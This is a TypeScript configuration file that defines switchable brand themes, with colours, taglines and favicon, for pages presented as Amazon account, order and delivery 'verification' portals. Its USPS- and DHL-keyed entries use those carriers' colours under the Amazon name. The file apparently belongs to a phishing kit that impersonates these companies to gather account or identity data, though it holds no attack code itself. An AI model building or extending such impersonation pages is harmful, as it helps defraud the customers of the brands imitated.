type BrandTheme = {
  navy: string;
  panel: string;
  panel2: string;
  orange: string;
  orange2: string;
  text: string;
  muted: string;
  card: string;
  cardBorder: string;
  glow1: string;
  glow2: string;
  badgeBorder: string;
  badgeBg: string;
  badgeText: string;
  pillBorder: string;
  pillBg: string;
  pillText: string;
};

type BrandConfig = {
  id: 'amazon' | 'usps' | 'dhl';
  name: string;
  portal: string;
  tagline: string;
  legal: string;
  promises: string[];
  favicon: string;
  theme: BrandTheme;
};

const AMAZON_BRAND: BrandConfig = {
  id: 'amazon',
  name: 'Amazon',
  portal: 'Amazon Account Services',
  tagline: 'Orders. Delivery. Account security.',
  legal: 'Amazon account and order verification portal.',
  promises: ['Secure session', 'Account protected', 'Customer support'],
  favicon: '/favicon.png?v=brand-10',
  theme: {
    navy: '#131921',
    panel: '#232f3e',
    panel2: '#0f1a25',
    orange: '#ff9900',
    orange2: '#f3a847',
    text: '#f6f8fa',
    muted: '#d5dbdb',
    card: '#ffffff',
    cardBorder: '#d5d9d9',
    glow1: 'rgba(255,153,0,0.14)',
    glow2: 'rgba(19,25,33,0.22)',
    badgeBorder: 'rgba(255,153,0,0.46)',
    badgeBg: 'rgba(255,153,0,0.14)',
    badgeText: '#ffd7a1',
    pillBorder: '#d5d9d9',
    pillBg: '#f3f5f7',
    pillText: '#0f2f52',
  },
};

const USPS_BRAND: BrandConfig = {
  id: 'usps',
  name: 'Amazon',
  portal: 'Amazon Recipient Verification Center',
  tagline: 'Track. Verify. Deliver.',
  legal: 'Amazon account and order verification portal.',
  promises: ['Domestic route checks', 'Recipient identity checks', '24/7 support'],
  favicon: '/favicon.png?v=brand-10',
  theme: {
    navy: '#11284c',
    panel: '#17386a',
    panel2: '#1f4a88',
    orange: '#d01f2e',
    orange2: '#ef3b4c',
    text: '#edf4ff',
    muted: '#c3d4ee',
    card: '#f8fbff',
    cardBorder: '#ced9ec',
    glow1: 'rgba(208,31,46,0.18)',
    glow2: 'rgba(17,40,76,0.24)',
    badgeBorder: 'rgba(239,59,76,0.45)',
    badgeBg: 'rgba(239,59,76,0.16)',
    badgeText: '#ffd6db',
    pillBorder: '#d5dceb',
    pillBg: '#f5f7fc',
    pillText: '#274775',
  },
};

const DHL_BRAND: BrandConfig = {
  id: 'dhl',
  name: 'Amazon',
  portal: 'Amazon Delivery Verification Center',
  tagline: 'Reliable. Secure. Confirmed.',
  legal: 'Amazon account and order verification portal.',
  promises: ['Route protection', 'Identity checks', 'Around-the-clock support'],
  favicon: '/favicon.png?v=brand-10',
  theme: {
    navy: '#7b0015',
    panel: '#b2041f',
    panel2: '#d40511',
    orange: '#ffd400',
    orange2: '#ffe36a',
    text: '#2a1200',
    muted: '#ffe8a3',
    card: '#fffdf4',
    cardBorder: '#f0e0a3',
    glow1: 'rgba(255,212,0,0.25)',
    glow2: 'rgba(212,5,17,0.2)',
    badgeBorder: 'rgba(255,212,0,0.55)',
    badgeBg: 'rgba(255,212,0,0.2)',
    badgeText: '#3a2300',
    pillBorder: '#f2d772',
    pillBg: '#fff7d1',
    pillText: '#654400',
  },
};

const selected = 'amazon';
const BRAND_MAP: Record<string, BrandConfig> = {
  amazon: AMAZON_BRAND,
  usps: USPS_BRAND,
  dhl: DHL_BRAND,
};

export const BRAND: BrandConfig = BRAND_MAP[selected] || USPS_BRAND;
export const BRAND_PROMISES = BRAND.promises;

